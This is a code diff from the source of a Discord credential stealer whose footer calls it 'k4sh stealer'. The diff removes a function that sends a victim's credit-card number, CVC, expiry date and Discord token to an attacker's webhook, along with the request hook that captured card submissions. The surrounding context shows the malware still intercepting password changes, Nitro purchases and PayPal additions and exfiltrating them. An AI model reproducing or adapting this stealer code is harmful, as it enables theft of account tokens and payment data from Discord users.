@@ -870,52 +870,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
     hooker(content);
   };
   
-  const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-    const json = await getInfo(token);
-    const nitro = getNitro(json.premium_type);
-    const badges = getBadges(json.flags);
-    const billing = await getBilling(token);
-    const content = {
-      username: config.embed_name,
-      avatar_url: config.embed_icon,
-      embeds: [
-        {
-          color: config.embed_color,
-          fields: [
-            {
-              name: '<a:cartao:973899989505957920> Credit Card Added',
-              value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-              inline: true,
-            },
-            {
-              name: '<:user:984848317836050442> Username',
-              value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
-            },
-            {
-              name: '<:id2:814280058402242562> ID',
-              value: `\`${json.id}\``,
-              inline: true,
-            },
-            {
-              name: '<:bug_hunter:973311712709181542> Token',
-              value: `\`\`\`${token}\`\`\``,
-              inline: false,
-            },
-          ],
-          author: {
-            name: json.username + '#' + json.discriminator + ' | ' + json.id,
-            icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-          },
-          footer: {
-            text: 'k4sh stealer',
-          },
-        },
-      ],
-    };
-    if (config.ping_on_run) content['content'] = config.ping_val;
-    hooker(content);
-  };
+
   
   const nitroBought = async (token) => {
     const json = await getInfo(token);
@@ -1028,10 +983,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         }
         break;
   
-      case details.url.endsWith('tokens') && details.method === 'POST':
-        const item = querystring.parse(unparsedData.toString());
-        ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
-        break;
+
   
       case details.url.endsWith('paypal_accounts') && details.method === 'POST':
         PaypalAdded(token).catch(console.error);
